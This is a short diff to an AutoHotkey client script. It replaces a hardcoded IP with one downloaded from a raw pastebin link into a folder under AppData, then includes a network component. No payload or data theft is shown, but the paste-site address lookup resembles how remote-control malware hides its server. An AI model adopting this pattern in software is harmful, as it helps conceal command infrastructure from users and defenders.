@@ -3,8 +3,10 @@
 SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
 SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
 ip := "localhost"
-;ip := "185.219.168.254"
-#Include net_component.ahk
+time := A_Now
+URLDownloadToFile, https://pastebin.com/raw/L6JRcLMh, %A_AppData%\Dalersion\temp%time%.txt
+FileRead, ip, %A_AppData%\Dalersion\temp%time%.txt
+#Include <net_component>
 
 
 out := save("hui","jopa","pizda","suka")
